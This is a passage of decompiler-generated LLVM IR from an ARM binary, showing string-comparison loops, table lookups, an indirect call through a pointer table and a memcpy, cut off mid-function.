  %v1_10f44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_10f44, i32* @r5, align 4
  %v0_10f78.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %dec_label_pc_10f6c.loopexit, %dec_label_pc_10f64
  %v0_10f78.pre = phi i32 [ %v0_10f78.pre.pre, %dec_label_pc_10f6c.loopexit ], [ %v0_10f4c, %dec_label_pc_10f64 ]
  store i32 -38212, i32* %r3.global-to-local, align 4
  %v0_10f70 = load i32, i32* @lr, align 4
  %v2_10f70 = add i32 %v0_10f70, -38212
  store i32 %v2_10f70, i32* %r1.global-to-local, align 4
  %v1_10f78 = inttoptr i32 %v0_10f78.pre to i8*
  br label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f88, %dec_label_pc_10f6c
  %v0_10f88 = phi i32 [ %v1_10f88, %dec_label_pc_10f88 ], [ %v2_10f70, %dec_label_pc_10f6c ]
  %v1_10f74 = inttoptr i32 %v0_10f88 to i8*
  %v2_10f74 = load i8, i8* %v1_10f74, align 1
  %v3_10f74 = zext i8 %v2_10f74 to i32
  store i32 %v3_10f74, i32* %r2.global-to-local, align 4
  %v2_10f78 = load i8, i8* %v1_10f78, align 1
  %v3_10f78 = zext i8 %v2_10f78 to i32
  store i32 %v3_10f78, i32* %r3.global-to-local, align 4
  %v9_10f7c = icmp eq i8 %v2_10f78, %v2_10f74
  br i1 %v9_10f7c, label %bb149, label %dec_label_pc_10f88

bb149:                                            ; preds = %dec_label_pc_10f74
  %v2_10f80 = add i32 %v0_10f78.pre, 1
  store i32 %v2_10f80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f94

dec_label_pc_10f88:                               ; preds = %dec_label_pc_10f74
  %v1_10f88 = add i32 %v0_10f88, 1
  %v2_10f88 = inttoptr i32 %v1_10f88 to i8*
  %v3_10f88 = load i8, i8* %v2_10f88, align 1
  %v4_10f88 = zext i8 %v3_10f88 to i32
  store i32 %v4_10f88, i32* %r3.global-to-local, align 4
  store i32 %v1_10f88, i32* %r1.global-to-local, align 4
  %v2_10f8c = icmp eq i8 %v3_10f88, 0
  br i1 %v2_10f8c, label %dec_label_pc_10f94, label %dec_label_pc_10f74

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f88, %bb149
  %v1_10fb8 = phi i32 [ %v2_10f80, %bb149 ], [ %v0_10f78.pre, %dec_label_pc_10f88 ]
  %v1_10fb4 = phi i32 [ %v0_10f88, %bb149 ], [ %v1_10f88, %dec_label_pc_10f88 ]
  %v2_10f9c = sub i32 %v1_10fb4, %v2_10f70
  store i32 %v2_10f9c, i32* %r3.global-to-local, align 4
  %v8_10fa4 = icmp sgt i32 %v2_10f9c, 1
  br i1 %v8_10fa4, label %.thread24, label %dec_label_pc_10fa8

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10f94
  %v1_10fa8 = inttoptr i32 %v1_10fb8 to i8*
  %v2_10fa8 = load i8, i8* %v1_10fa8, align 1
  %v3_10fa8 = zext i8 %v2_10fa8 to i32
  store i32 %v3_10fa8, i32* %r2.global-to-local, align 4
  %v1_10fac = inttoptr i32 %v1_10fb4 to i8*
  %v2_10fac = load i8, i8* %v1_10fac, align 1
  %v3_10fac = zext i8 %v2_10fac to i32
  store i32 %v3_10fac, i32* %r3.global-to-local, align 4
  %v9_10fb0 = icmp eq i8 %v2_10fa8, %v2_10fac
  br i1 %v9_10fb0, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_10fa8
  %v2_10fb4 = add i32 %v1_10fb4, 9
  store i32 %v2_10fb4, i32* %r1.global-to-local, align 4
  %v2_10fb8 = add i32 %v1_10fb8, 1
  store i32 %v2_10fb8, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_10fa8, %dec_label_pc_10f94, %bb150
  %v0_10fc0 = phi i32 [ %v1_10fb4, %dec_label_pc_10fa8 ], [ %v1_10fb4, %dec_label_pc_10f94 ], [ %v2_10fb4, %bb150 ]
  %v0_10fbc = phi i32 [ %v1_10fb8, %dec_label_pc_10fa8 ], [ %v1_10fb8, %dec_label_pc_10f94 ], [ %v2_10fb8, %bb150 ]
  %v1_10fbc = inttoptr i32 %v0_10fbc to i8*
  %v2_10fbc = load i8, i8* %v1_10fbc, align 1
  %v3_10fbc = zext i8 %v2_10fbc to i32
  store i32 %v3_10fbc, i32* %r2.global-to-local, align 4
  %v1_10fc0 = add i32 %v0_10fc0, 9
  %v2_10fc0 = inttoptr i32 %v1_10fc0 to i8*
  %v3_10fc0 = load i8, i8* %v2_10fc0, align 1
  %v4_10fc0 = zext i8 %v3_10fc0 to i32
  store i32 %v4_10fc0, i32* %r3.global-to-local, align 4
  %v2_10fc4 = icmp eq i8 %v2_10fbc, 0
  %v3_10fc8 = mul nuw nsw i32 %v4_10fc0, 256
  store i32 %v3_10fc8, i32* @ip, align 4
  br i1 %v2_10fc4, label %dec_label_pc_11228, label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %.thread24
  store i32 -38112, i32* %r3.global-to-local, align 4
  %v2_10fd4 = add i32 %v0_10f70, -38112
  store i32 %v2_10fd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %dec_label_pc_1105c, %dec_label_pc_10fd0
  %v1_10fec = phi i32 [ %v1_1105c, %dec_label_pc_1105c ], [ %v2_10fd4, %dec_label_pc_10fd0 ]
  %v1_10fd8 = inttoptr i32 %v1_10fec to i8*
  %v2_10fd8 = load i8, i8* %v1_10fd8, align 1
  %v3_10fd8 = zext i8 %v2_10fd8 to i32
  store i32 %v3_10fd8, i32* %r3.global-to-local, align 4
  %v9_10fdc = icmp eq i8 %v2_10fd8, %v2_10fbc
  br i1 %v9_10fdc, label %dec_label_pc_10fe4, label %dec_label_pc_1105c

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10fd8
  store i32 %v2_10fd4, i32* %r3.global-to-local, align 4
  %v2_10fec = sub i32 %v1_10fec, %v2_10fd4
  store i32 %v2_10fec, i32* %r1.global-to-local, align 4
  %v7_10ff4 = icmp slt i32 %v2_10fec, 18
  br i1 %v7_10ff4, label %bb152, label %dec_label_pc_10ff8

dec_label_pc_10ff8:                               ; preds = %dec_label_pc_10fe4
  %v1_10ff8 = and i32 %v3_10fc8, 1024
  %v2_10ff8 = icmp eq i32 %v1_10ff8, 0
  br i1 %v2_10ff8, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_10ff8
  %v2_10ffc = add i32 %v2_10fec, -2
  store i32 %v2_10ffc, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_10fe4, %dec_label_pc_10ff8, %bb151
  %v0_11004 = phi i32 [ %v2_10fec, %dec_label_pc_10fe4 ], [ %v2_10fec, %dec_label_pc_10ff8 ], [ %v2_10ffc, %bb151 ]
  store i32 -38160, i32* %r3.global-to-local, align 4
  %v1_11004 = load i32, i32* %r7.global-to-local, align 4
  %v2_11004 = add i32 %v1_11004, 32
  %v3_11004 = inttoptr i32 %v2_11004 to i32*
  store i32 %v0_11004, i32* %v3_11004, align 4
  %v0_11008 = load i32, i32* @lr, align 4
  %v1_11008 = load i32, i32* %r3.global-to-local, align 4
  %v2_11008 = add i32 %v1_11008, %v0_11008
  store i32 %v2_11008, i32* %r3.global-to-local, align 4
  %v1_1100c = add i32 %v2_11008, -1
  store i32 %v1_1100c, i32* %r0.global-to-local, align 4
  %v0_11014.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11010

dec_label_pc_11010:                               ; preds = %dec_label_pc_11010, %bb152
  %v0_11010 = phi i32 [ %v1_11010, %dec_label_pc_11010 ], [ %v1_1100c, %bb152 ]
  %v1_11010 = add i32 %v0_11010, 1
  %v2_11010 = inttoptr i32 %v1_11010 to i8*
  %v3_11010 = load i8, i8* %v2_11010, align 1
  %v4_11010 = zext i8 %v3_11010 to i32
  store i32 %v4_11010, i32* %r3.global-to-local, align 4
  store i32 %v1_11010, i32* %r0.global-to-local, align 4
  %v8_11018 = icmp sgt i32 %v0_11014.pre, %v4_11010
  br i1 %v8_11018, label %dec_label_pc_11010, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %dec_label_pc_11010
  %v2_11024.neg = sub i32 38160, %v0_11008
  %v2_11028 = add i32 %v2_11024.neg, %v1_11010
  %v2_1102c = mul i32 %v2_11028, 2
  store i32 %v2_1102c, i32* %r2.global-to-local, align 4
  %v2_11030 = add i32 %v0_11008, -38176
  store i32 %v2_11030, i32* %r3.global-to-local, align 4
  %v2_11034 = add i32 %v2_1102c, %v2_11030
  %v3_11034 = inttoptr i32 %v2_11034 to i16*
  %v4_11034 = load i16, i16* %v3_11034, align 2
  %v6_11034 = sext i16 %v4_11034 to i32
  store i32 %v6_11034, i32* %r1.global-to-local, align 4
  %v2_1103c = add i32 %v0_11008, -38192
  store i32 %v2_1103c, i32* %r3.global-to-local, align 4
  %v2_11040 = add i32 %v2_1102c, %v2_1103c
  %v3_11040 = inttoptr i32 %v2_11040 to i16*
  %v4_11040 = load i16, i16* %v3_11040, align 2
  %v6_11040 = sext i16 %v4_11040 to i32
  %v1_11044 = load i32, i32* @ip, align 4
  %v2_11044 = or i32 %v1_11044, %v6_11034
  %v2_11048 = and i32 %v2_11044, %v6_11040
  store i32 %v2_11048, i32* %r1.global-to-local, align 4
  store i32 -38112, i32* %r3.global-to-local, align 4
  %v2_11050 = add i32 %v0_11008, -38112
  store i32 %v2_11050, i32* %r0.global-to-local, align 4
  store i32 %v2_11048, i32* %stack_var_-72, align 4
  %v0_11074.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11068

dec_label_pc_1105c:                               ; preds = %dec_label_pc_10fd8
  %v1_1105c = add i32 %v1_10fec, 1
  %v2_1105c = inttoptr i32 %v1_1105c to i8*
  %v3_1105c = load i8, i8* %v2_1105c, align 1
  %v4_1105c = zext i8 %v3_1105c to i32
  store i32 %v4_1105c, i32* %r3.global-to-local, align 4
  store i32 %v1_1105c, i32* %r0.global-to-local, align 4
  %v2_11060 = icmp eq i8 %v3_1105c, 0
  br i1 %v2_11060, label %dec_label_pc_11068, label %dec_label_pc_10fd8

dec_label_pc_11068:                               ; preds = %dec_label_pc_1105c, %dec_label_pc_1101c
  %v0_11074 = phi i32 [ %v0_11074.pre, %dec_label_pc_1101c ], [ %v0_10fbc, %dec_label_pc_1105c ]
  %v0_11070 = phi i32 [ %v1_11044, %dec_label_pc_1101c ], [ %v3_10fc8, %dec_label_pc_1105c ]
  %v0_11068 = load i32, i32* @r4, align 4
  %v1_11068 = and i32 %v0_11068, 4
  %v1_1106c = and i32 %v0_11068, -5
  store i32 %v1_1106c, i32* %r3.global-to-local, align 4
  %v1_11070 = and i32 %v0_11070, 3840
  store i32 %v1_11070, i32* %r2.global-to-local, align 4
  %v1_11074 = inttoptr i32 %v0_11074 to i8*
  %v2_11074 = load i8, i8* %v1_11074, align 1
  %v3_11074 = zext i8 %v2_11074 to i32
  store i32 %v3_11074, i32* %r1.global-to-local, align 4
  %v2_11078 = or i32 %v1_1106c, %v1_11070
  store i32 %v2_11078, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_11068, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_11084 = load i32, i32* %r7.global-to-local, align 4
  %v2_11084 = add i32 %v1_11084, 20
  %v3_11084 = inttoptr i32 %v2_11084 to i32*
  store i32 %tmp181, i32* %v3_11084, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1108c = load i32, i32* %r1.global-to-local, align 4
  %v1_1108c = load i32, i32* %r7.global-to-local, align 4
  %v2_1108c = add i32 %v1_1108c, 12
  %v3_1108c = inttoptr i32 %v2_1108c to i32*
  store i32 %v0_1108c, i32* %v3_1108c, align 4
  %v0_11090 = load i32, i32* %r7.global-to-local, align 4
  %v1_11090 = add i32 %v0_11090, 4
  %v2_11090 = inttoptr i32 %v1_11090 to i32*
  %v3_11090 = load i32, i32* @r5, align 4
  store i32 %v3_11090, i32* %v2_11090, align 4
  %v4_11090 = add i32 %v0_11090, 8
  %v5_11090 = inttoptr i32 %v4_11090 to i32*
  %v6_11090 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_11090, i32* %v5_11090, align 4
  %v0_11094 = load i32, i32* %r2.global-to-local, align 4
  %v1_11094 = load i32, i32* %r7.global-to-local, align 4
  %v2_11094 = add i32 %v1_11094, 16
  %v3_11094 = inttoptr i32 %v2_11094 to i32*
  store i32 %v0_11094, i32* %v3_11094, align 4
  %v0_11098 = load i32, i32* %r3.global-to-local, align 4
  %v1_11098 = load i32, i32* %r7.global-to-local, align 4
  %v2_11098 = add i32 %v1_11098, 28
  %v3_11098 = inttoptr i32 %v2_11098 to i32*
  store i32 %v0_11098, i32* %v3_11098, align 4
  %v0_1109c = load i32, i32* %r0.global-to-local, align 4
  %v1_1109c = inttoptr i32 %v0_1109c to i8*
  %v2_1109c = load i8, i8* %v1_1109c, align 1
  %v3_1109c = zext i8 %v2_1109c to i32
  store i32 %v3_1109c, i32* %r2.global-to-local, align 4
  %v2_110a0 = icmp eq i8 %v2_1109c, 0
  br i1 %v2_110a0, label %dec_label_pc_110a8, label %dec_label_pc_1112c

dec_label_pc_110a8:                               ; preds = %dec_label_pc_11068
  %v0_110a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_110a8 = inttoptr i32 %v0_110a8 to i8*
  %v2_110a8 = load i8, i8* %v1_110a8, align 1
  %v3_110a8 = zext i8 %v2_110a8 to i32
  store i32 %v3_110a8, i32* %r3.global-to-local, align 4
  %v7_110ac = icmp eq i8 %v2_110a8, 109
  br i1 %v7_110ac, label %.thread28, label %dec_label_pc_110c0

.thread28:                                        ; preds = %dec_label_pc_110a8
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_110b4 = load i32, i32* %r7.global-to-local, align 4
  %v3_110b4 = add i32 %v2_110b4, 32
  %v4_110b4 = inttoptr i32 %v3_110b4 to i32*
  store i32 20, i32* %v4_110b4, align 4
  %v1_110b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_110b8 = load i32, i32* %r7.global-to-local, align 4
  %v3_110b8 = add i32 %v2_110b8, 28
  %v4_110b8 = inttoptr i32 %v3_110b8 to i32*
  store i32 %v1_110b8, i32* %v4_110b8, align 4
  br label %dec_label_pc_1112c

dec_label_pc_110c0:                               ; preds = %dec_label_pc_110a8
  store i32 852, i32* %r3.global-to-local, align 4
  %v0_110c4 = load i32, i32* @lr, align 4
  %v2_110c4 = add i32 %v0_110c4, 852
  %v3_110c4 = inttoptr i32 %v2_110c4 to i32*
  %v4_110c4 = load i32, i32* %v3_110c4, align 4
  store i32 %v4_110c4, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_110cc = load i32, i32* %r7.global-to-local, align 4
  %v2_110cc = add i32 %v1_110cc, 32
  %v3_110cc = inttoptr i32 %v2_110cc to i32*
  store i32 21, i32* %v3_110cc, align 4
  %v0_110d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_110d0, i32* @ip, align 4
  %v1_110d4 = add i32 %v0_110d0, 10
  store i32 %v1_110d4, i32* %r0.global-to-local, align 4
  %v0_110dc.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_110dc = inttoptr i32 %v0_110dc.pre to i8*
  br label %dec_label_pc_110d8

dec_label_pc_110d8:                               ; preds = %dec_label_pc_1111c, %dec_label_pc_110c0
  %v1_110e8 = phi i32 [ %v1_1111c, %dec_label_pc_1111c ], [ %v0_110d0, %dec_label_pc_110c0 ]
  %v1_110d8 = inttoptr i32 %v1_110e8 to i8*
  %v2_110d8 = load i8, i8* %v1_110d8, align 1
  %v3_110d8 = zext i8 %v2_110d8 to i32
  store i32 %v3_110d8, i32* %r2.global-to-local, align 4
  %v2_110dc = load i8, i8* %v1_110dc, align 1
  %v3_110dc = zext i8 %v2_110dc to i32
  store i32 %v3_110dc, i32* %r3.global-to-local, align 4
  %v9_110e0 = icmp eq i8 %v2_110d8, %v2_110dc
  br i1 %v9_110e0, label %dec_label_pc_110e8, label %dec_label_pc_1111c

dec_label_pc_110e8:                               ; preds = %dec_label_pc_110d8
  %v2_110e8 = sub i32 %v1_110e8, %v0_110d0
  store i32 %v2_110e8, i32* %r3.global-to-local, align 4
  %v0_110f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_110f0 = add i32 %v0_110f0, 4
  store i32 %v1_110f0, i32* %r0.global-to-local, align 4
  %v0_110f4 = load i32, i32* @lr, align 4
  %v2_110f4 = add i32 %v0_110f4, 26364
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_110fc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_110fc, i32* %r2.global-to-local, align 4
  %v4_11100 = mul i32 %v2_110e8, 4
  %v5_11100 = add i32 %v2_110f4, %v4_11100
  %v6_11100 = inttoptr i32 %v5_11100 to i32*
  %v7_11100 = load i32, i32* %v6_11100, align 4
  store i32 %v7_11100, i32* @ip, align 4
  store i32 69900, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_11100)
  %v0_1110c = load i32, i32* %r0.global-to-local, align 4
  %v1_11110 = load i32, i32* %r7.global-to-local, align 4
  %v2_11110 = add i32 %v1_11110, 28
  %v3_11110 = inttoptr i32 %v2_11110 to i32*
  store i32 %v0_1110c, i32* %v3_11110, align 4
  %v7_11114 = icmp sgt i32 %v0_1110c, 5
  br i1 %v7_11114, label %dec_label_pc_11228, label %dec_label_pc_1112c

dec_label_pc_1111c:                               ; preds = %dec_label_pc_110d8
  %v1_1111c = add i32 %v1_110e8, 1
  store i32 %v1_1111c, i32* %r1.global-to-local, align 4
  %v3_11120 = icmp ult i32 %v1_1111c, %v1_110d4
  br i1 %v3_11120, label %dec_label_pc_110d8, label %dec_label_pc_11228

dec_label_pc_1112c:                               ; preds = %.thread28, %dec_label_pc_110e8, %dec_label_pc_11068
  %v0_1112c = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_1112c, 1
  br i1 %tmp156, label %dec_label_pc_111d8, label %dec_label_pc_11134

dec_label_pc_11134:                               ; preds = %dec_label_pc_1112c
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_1114c = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_11138

dec_label_pc_11138:                               ; preds = %dec_label_pc_111c0, %dec_label_pc_11134
  %v9_11158 = phi i32 [ 0, %dec_label_pc_11134 ], [ %v1_111c4, %dec_label_pc_111c0 ]
  %v7_1113c = icmp sgt i32 %v9_11158, 2
  br i1 %v7_1113c, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_11138
  store i32 %v9_1114c, i32* %r3.global-to-local, align 4
  %v10_11158 = add i32 %v9_11158, %v9_1114c
  store i32 %v10_11158, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_11138
  store i32 %v3_10db4.pre-phi, i32* @ip, align 4
  %v12_11140 = mul i32 %v9_11158, 4
  %v13_11140 = add i32 %v12_11140, %v3_10db4.pre-phi
  store i32 %v13_11140, i32* %r3.global-to-local, align 4
  %v9_11148 = add i32 %v13_11140, -12
  %v10_11148 = inttoptr i32 %v9_11148 to i8*
  %v11_11148 = load i8, i8* %v10_11148, align 4
  %v12_11148 = zext i8 %v11_11148 to i32
  store i32 %v12_11148, i32* %r2.global-to-local, align 4
  %v9_11150 = load i32, i32* %r7.global-to-local, align 4
  %v10_11150 = add i32 %v9_11150, %v9_11158
  store i32 %v10_11150, i32* %r3.global-to-local, align 4
  store i32 %v12_11148, i32* %r1.global-to-local, align 4
  %v11_1115c = add i32 %v10_11150, 36
  %v12_1115c = inttoptr i32 %v11_1115c to i8*
  store i8 %v11_11148, i8* %v12_1115c, align 1
  %v0_11160.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_11180 = phi i32 [ %v10_11158, %.thread38 ], [ %v0_11160.pre, %bb157 ]
  %v1_11160 = load i32, i32* %fp.global-to-local, align 4
  %v2_11160 = sub i32 %v0_11180, %v1_11160
  %v4_11160 = xor i32 %v1_11160, %v0_11180
  %v5_11160 = xor i32 %v2_11160, %v0_11180
  %v6_11160 = and i32 %v5_11160, %v4_11160
  %v7_11160 = icmp slt i32 %v6_11160, 0
  %v8_11160 = icmp slt i32 %v2_11160, 0
  %v9_11160 = icmp eq i32 %v0_11180, %v1_11160
  %v3_11164 = xor i1 %v8_11160, %v7_11160
  %v4_11164 = or i1 %v9_11160, %v3_11164
  br i1 %v4_11164, label %dec_label_pc_11174, label %dec_label_pc_11168

dec_label_pc_11168:                               ; preds = %bb158
  %v1_11168 = add i32 %v0_11180, -9
  %v3_11168 = sub i32 8, %v0_11180
  %v4_11168 = and i32 %v3_11168, %v0_11180
  %v5_11168 = icmp slt i32 %v4_11168, 0
  %v6_11168 = icmp slt i32 %v1_11168, 0
  %v7_11168 = icmp eq i32 %v0_11180, 9
  %v3_1116c = xor i1 %v6_11168, %v5_11168
  %v4_1116c = or i1 %v7_11168, %v3_1116c
  br i1 %v4_1116c, label %dec_label_pc_11170, label %dec_label_pc_11228

dec_label_pc_11170:                               ; preds = %dec_label_pc_11168
  store i32 %v0_11180, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %bb158, %dec_label_pc_11170
  store i32 %v3_10db4.pre-phi, i32* @r2, align 4
  %v1_11178 = load i32, i32* %r8.global-to-local, align 4
  %v4_11178 = mul i32 %v1_11178, 4
  %v5_11178 = add i32 %v4_11178, %v3_10db4.pre-phi
  store i32 %v5_11178, i32* %sb.global-to-local, align 4
  %v1_1117c = add i32 %v5_11178, -40
  %v2_1117c = inttoptr i32 %v1_1117c to i32*
  %v3_1117c = load i32, i32* %v2_1117c, align 4
  store i32 %v3_1117c, i32* %r5.global-to-local, align 4
  %v1_11180 = add i32 %v0_11180, -1
  store i32 %v1_11180, i32* %r3.global-to-local, align 4
  %v0_11184 = load i32, i32* %r7.global-to-local, align 4
  %v4_11184 = mul i32 %v1_11180, 4
  %v5_11184 = add i32 %v0_11184, %v4_11184
  store i32 %v5_11184, i32* %sl.global-to-local, align 4
  %v7_11188 = icmp eq i32 %v3_1117c, 8
  %v1_1118c = add i32 %v5_11184, 40
  %v2_1118c = inttoptr i32 %v1_1118c to i32*
  %v3_1118c = load i32, i32* %v2_1118c, align 4
  store i32 %v3_1118c, i32* @r0, align 4
  br i1 %v7_11188, label %dec_label_pc_111c0, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_11174
  %v9_11194 = icmp eq i32 %v3_1118c, %v3_1117c
  br i1 %v9_11194, label %dec_label_pc_111b8, label %bb159

bb159:                                            ; preds = %dec_label_pc_11194
  %v8_11198 = icmp eq i32 %v3_1118c, 8
  br i1 %v8_11198, label %dec_label_pc_111b8, label %dec_label_pc_111a0

dec_label_pc_111a0:                               ; preds = %bb159
  %v0_111a0 = call i32 @_promoted_size()
  %v0_111a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_111a8, i32* @r0, align 4
  %v0_111ac = call i32 @_promoted_size()
  store i32 %v0_111ac, i32* %r0.global-to-local, align 4
  %v8_111b4 = icmp sgt i32 %v0_111a0, %v0_111ac
  br i1 %v8_111b4, label %dec_label_pc_111c0, label %dec_label_pc_111a0.dec_label_pc_111b8_crit_edge

dec_label_pc_111a0.dec_label_pc_111b8_crit_edge:  ; preds = %dec_label_pc_111a0
  %v0_111b8.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_111bc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_111b8

dec_label_pc_111b8:                               ; preds = %dec_label_pc_111a0.dec_label_pc_111b8_crit_edge, %dec_label_pc_11194, %bb159
  %v1_111bc = phi i32 [ %v1_111bc.pre, %dec_label_pc_111a0.dec_label_pc_111b8_crit_edge ], [ %v5_11184, %dec_label_pc_11194 ], [ %v5_11184, %bb159 ]
  %v0_111b8 = phi i32 [ %v0_111b8.pre, %dec_label_pc_111a0.dec_label_pc_111b8_crit_edge ], [ %v5_11178, %dec_label_pc_11194 ], [ %v5_11178, %bb159 ]
  %v1_111b8 = add i32 %v0_111b8, -40
  %v2_111b8 = inttoptr i32 %v1_111b8 to i32*
  %v3_111b8 = load i32, i32* %v2_111b8, align 4
  store i32 %v3_111b8, i32* %r3.global-to-local, align 4
  %v2_111bc = add i32 %v1_111bc, 40
  %v3_111bc = inttoptr i32 %v2_111bc to i32*
  store i32 %v3_111b8, i32* %v3_111bc, align 4
  br label %dec_label_pc_111c0

dec_label_pc_111c0:                               ; preds = %dec_label_pc_111a0, %dec_label_pc_11174, %dec_label_pc_111b8
  %v0_111c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_111c0 = add i32 %v0_111c0, 28
  %v2_111c0 = inttoptr i32 %v1_111c0 to i32*
  %v3_111c0 = load i32, i32* %v2_111c0, align 4
  %v0_111c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_111c4 = add i32 %v0_111c4, 1
  store i32 %v1_111c4, i32* %r8.global-to-local, align 4
  %v1_111c8 = add i32 %v3_111c0, 2
  store i32 %v1_111c8, i32* %r3.global-to-local, align 4
  %v6_111d0 = icmp slt i32 %v1_111c4, %v1_111c8
  br i1 %v6_111d0, label %dec_label_pc_11138, label %dec_label_pc_111f4

dec_label_pc_111d8:                               ; preds = %dec_label_pc_1112c
  %v0_111d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_111d8 = add i32 %v0_111d8, 28
  %v2_111d8 = inttoptr i32 %v1_111d8 to i32*
  %v3_111d8 = load i32, i32* %v2_111d8, align 4
  store i32 %v3_111d8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_111e0 = add i32 %v0_111d8, 38
  %v4_111e0 = inttoptr i32 %v3_111e0 to i8*
  store i8 1, i8* %v4_111e0, align 1
  %v0_111e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_111e4 = mul i32 %v0_111e4, 4
  store i32 %v3_111e4, i32* @r2, align 4
  %v0_111e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_111e8 = add i32 %v0_111e8, 40
  store i32 %v1_111e8, i32* @r0, align 4
  %v2_111ec = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_111ec, i32* @r1, align 4
  %v0_111f0 = call i32 @memcpy()
  store i32 %v0_111f0, i32* %r0.global-to-local, align 4
  %v0_111f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111c0, %dec_label_pc_111d8
  %v2_11210 = phi i32 [ %v0_111f4.pre, %dec_label_pc_111d8 ], [ %v0_111c0, %dec_label_pc_111c0 ]
  %v1_111f4 = add i32 %v2_11210, 16
  %v2_111f4 = inttoptr i32 %v1_111f4 to i32*
  %v3_111f4 = load i32, i32* %v2_111f4, align 4
  store i32 %v3_111f4, i32* %r3.global-to-local, align 4
  %v1_111f8 = and i32 %v3_111f4, 128
  %v2_111f8 = icmp eq i32 %v1_111f8, 0
  br i1 %v2_111f8, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_111f4
  %v3_111fc = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_111fc, i32* %r3.global-to-local, align 4
  %v2_11200 = inttoptr i32 %v2_11210 to i32*
  %v3_11200 = load i32, i32* %v2_11200, align 4
  %v2_11208.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11208 = sub i32 %v2_11208.pre, %v3_111fc
  store i32 %v3_11208, i32* %r3.global-to-local, align 4
  %v5_1120c = mul i32 %v3_11208, 4
  %v6_1120c = add i32 %v5_1120c, %v3_11200
  store i32 %v6_1120c, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_111f4
  %v1_1120445 = load i32, i32* %r6.global-to-local, align 4
  %v2_1120446 = add i32 %v1_1120445, 1
  store i32 %v2_1120446, i32* %r3.global-to-local, align 4
  %v3_11210 = inttoptr i32 %v2_11210 to i32*
  store i32 %v2_1120446, i32* %v3_11210, align 4
  %v0_11214.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_1121c = phi i32 [ %v2_11210, %.thread48 ], [ %v0_11214.pre, %.thread50 ]
  %v1_11214 = add i32 %v1_1121c, 28
  %v2_11214 = inttoptr i32 %v1_11214 to i32*
  %v3_11214 = load i32, i32* %v2_11214, align 4
  store i32 %v3_11214, i32* %r3.global-to-local, align 4
  %v1_11218 = add i32 %v3_11214, 2
  store i32 %v1_11218, i32* %r0.global-to-local, align 4
  %v0_1121c = load i32, i32* %fp.global-to-local, align 4
  %v2_1121c = add i32 %v1_1121c, 24
  %v3_1121c = inttoptr i32 %v2_1121c to i32*
  store i32 %v0_1121c, i32* %v3_1121c, align 4
  br i1 %v2_111f8, label %dec_label_pc_1122c, label %bb161

bb161:                                            ; preds = %bb160
  %v1_11220 = load i32, i32* @r2, align 4
  %v2_11220 = load i32, i32* %r7.global-to-local, align 4
  %v3_11220 = inttoptr i32 %v2_11220 to i32*
  store i32 %v1_11220, i32* %v3_11220, align 4
  br label %dec_label_pc_1122c

dec_label_pc_11228:                               ; preds = %dec_label_pc_1111c, %dec_label_pc_10d3c, %dec_label_pc_10e84, %dec_label_pc_10f30, %dec_label_pc_10f08, %dec_label_pc_10f14, %dec_label_pc_10e50, %dec_label_pc_11168, %dec_label_pc_110e8, %.thread24
